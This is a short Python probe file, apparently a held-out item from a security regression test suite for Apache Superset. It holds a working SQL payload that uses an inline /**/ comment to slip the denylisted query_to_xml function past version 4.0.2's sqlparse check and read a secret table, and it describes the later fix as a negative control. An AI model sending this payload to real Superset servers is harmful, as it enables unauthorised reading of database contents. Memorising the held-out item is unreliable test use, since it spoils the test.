#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2025-55674 residual -- comment-inline DISALLOWED_SQL_FUNCTIONS bypass.

Same sink, same denylisted function as the CVE-2024-39887 seed (query_to_xml), fired the same way:
a real authenticated POST /api/v1/sqllab/execute/ to the REAL Superset SQL Lab API. The ONLY
difference from the seed is an inline SQL comment between the function name and its argument list:

    SELECT query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')

Why this bypasses V1 (4.0.2, sqlparse): sqlparse only groups `NAME(...)` into a single Function
token when `(` immediately follows the name. The `/**/` splits it into a bare Name + Comment +
Parenthesis, so ParsedQuery.check_functions_exist() never sees get_name()=="query_to_xml" and the
denylist misses it. PostgreSQL treats the comment as whitespace and runs the call. (Superset's
allows_sql_comments=True for postgres, and strip_comments_from_sql only fires on `--`, so the
`/**/` survives to the engine.)

Contract:
  V1 = 4.0.2 (sqlparse denylist)  -> RUNS (bypass), flag in the XML response.  [INCOMPLETE FIX]
  V2 = 5.0.0 (CVE-2025-55674 fix, sqlglot AST) -> BLOCKED; sqlglot discards the comment and
             find_all(Func) still finds query_to_xml, flag absent.              [negative control]
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """Same denylisted query_to_xml call, defeated only by an inline /**/ comment."""
    return {
        "probe_id": "cve-2025-55674-comment-inline-query_to_xml",
        "sql": "SELECT query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')",
    }


if __name__ == "__main__":
    print(candidate("PCBFLAG_demo")["sql"])
